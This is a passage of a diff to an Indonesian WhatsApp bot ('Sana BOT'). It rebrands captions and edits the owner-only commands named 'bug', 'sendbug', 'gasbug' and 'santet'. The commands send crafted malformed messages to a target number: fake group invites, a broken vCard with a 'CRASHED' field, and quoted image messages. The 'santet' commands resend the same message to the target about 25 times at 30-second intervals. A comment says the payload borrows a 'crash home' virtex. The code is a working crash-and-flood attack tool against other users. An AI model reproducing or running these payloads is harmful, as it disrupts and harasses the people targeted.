+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgc})
 }
 break
 case 'kisendbug9':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fgc = { 
 key: {
@@ -6242,13 +6307,13 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgc})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgc})
 await m.reply(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
 break
 case 'kigasbug9':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fgc1 = { 
 key: {
@@ -6260,14 +6325,14 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 "groupJid": "62895619083555-1616169743@g.us",
 "inviteCode": "mememteeeekkeke",
 "groupName": "P",
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
  'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
- jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgc1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fgc1})
+ jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgc1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fgc1})
 await m.reply(`Berhasil Mengirim Bug9 Di Nomer ${text}`)
 break
-case 'kibug10':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '20':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6295,11 +6360,11 @@ let stic = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:stic})
+ jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:stic})
  }
  break
 case 'kisendbug10':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let stic = { 
 "key": {
@@ -6324,11 +6389,11 @@ let stic = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:stic})
+ jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:stic})
  await m.reply(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
  break
 case 'kigasbug10':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let stic1 = { 
 "key": {
@@ -6353,13 +6418,13 @@ let stic1 = {
 "messageTimestamp": "1614070775",
 "status": "PENDING"
  }
- jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:stic1})
- jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:stic1})
+ jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:stic1})
+ jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:stic1})
  await m.reply(`Berhasil Mengirim Bug10 Di Nomer ${text}`)
  break
 //Bug quoted versi gua ini gua campuran sama yg virkon crash home yg udh punah itu🗿
-case 'kibug11':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '21':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6370,14 +6435,14 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"displayName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fkon})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fkon})
 }
 break 
 case 'kisendbug11':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fkon = { 
 key: { 
@@ -6385,14 +6450,14 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"displayName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fkon})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fkon})
 await m.reply(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
 break 
 case 'kigasbug11':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let fkon1 = { 
 key: { 
@@ -6400,15 +6465,15 @@ fromMe: false,
 participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
 },
 message: { "contactMessage": { 
-"displayName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵`,
+"displayName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵`,
  "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Masih gw pikirin;;;\nFN:Masih gw pikirin\nitem1.TEL;waid=35312338989:+353 1 233 8989\nitem1.X-ABLabel:Telepon\nX-WA-BIZ-NAME:No ku +353\nEND:VCARD\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+359996400\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;xnxx;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\;CHARSET=UTF-8\;type=HOME\,INTERNET\;ac;\nitem4.X-ABADR:\nitem4.X-ABLabel:Casa\nitem5.X-WHATSAPP;type=INTERNET:EMAIL;CRASHED=UTF-8;type=HOME,INTERNET:+\nitem5.X-ABLabel:INTERNET\nEND:VCARD`, 
  "jpegThumbnail": fs.readFileSync('./pict.jpg')}}}
- jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fkon1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:fkon1})
+ jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fkon1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:fkon1})
 await m.reply(`Berhasil Mengirim Bug11 Di Nomer ${text}`)
 break 
-case 'kibug12':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+case '22':
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku JO`
@@ -6423,17 +6488,17 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ `, 
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ `, 
+"groupName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ `, 
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ `, 
 'jpegThumbnail': thumb
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:finv})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:finv})
 }
 break
 case 'kisendbug12':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let finv = {
 key: { 
@@ -6445,17 +6510,17 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ `, 
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ `, 
+"groupName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ `, 
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ `, 
 'jpegThumbnail': thumb
 }
 }
 }
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:finv})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:finv})
 await m.reply(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
 break
 case 'kigasbug12':
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
 let finv1 = {
 key: { 
@@ -6467,19 +6532,19 @@ participant: `0@s.whatsapp.net`,
 "groupInviteMessage": {
 "groupJid": "6288213840883-1616169743@g.us",
 "inviteCode": `ith6ffr68`,
-"groupName": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ `, 
-"caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ `, 
+"groupName": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ `, 
+"caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ `, 
 'jpegThumbnail': thumb
 }
 }
 }
-jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:finv1})
-jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ "},{quoted:finv1})
+jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:finv1})
+jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ "},{quoted:finv1})
 await m.reply(`Berhasil Mengirim Bug12 Di Nomer ${text}`)
 break
         case 'kithelima': {         
           if(!m.key.fromMe) return
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (args.length == 0) return m.reply(`Jumlahnya?`)
 jumlah = `${encodeURI(q)}`
 for (let i = 0; i < jumlah; i++) {
@@ -6502,7 +6567,7 @@ for (let i = 0; i < jumlah; i++) {
             }
             break
                 case 'kibutto':
-                    if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+                    if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
                     if (!text) throw `Nomernya mana?`
                  buttonspc = [
                           {buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: jobot}, type: 1},
@@ -6520,7 +6585,7 @@ for (let i = 0; i < jumlah; i++) {
                       m.reply(`succes`)
                     break
            case 'kisantetto': { 
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -6531,70 +6596,70 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
             await m.reply(`Berhasil Mengirim Santet Di Nomer ${text}`)
             }
             break
         case 'kigassantet': {          
-          if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+          if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
           if (!text) throw `Nomernya mana?`
              asukonyol11 = { 
                     key: { 
@@ -6605,70 +6670,70 @@ for (let i = 0; i < jumlah; i++) {
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE`,
+                            "caption": `❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE`,
                             "jpegThumbnail": thumb
                         } 
                     } 
                 }
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
+            await jobotz.sendMessage(m.chat, {text:"❴ ㅊ ❈ Sana BOTㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
             await sleep(30000)
-            await jobotz.sendMessage(`${text}@s.whatsapp.net`, {text:"❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵ INFINITE"},{quoted:asukonyol11})
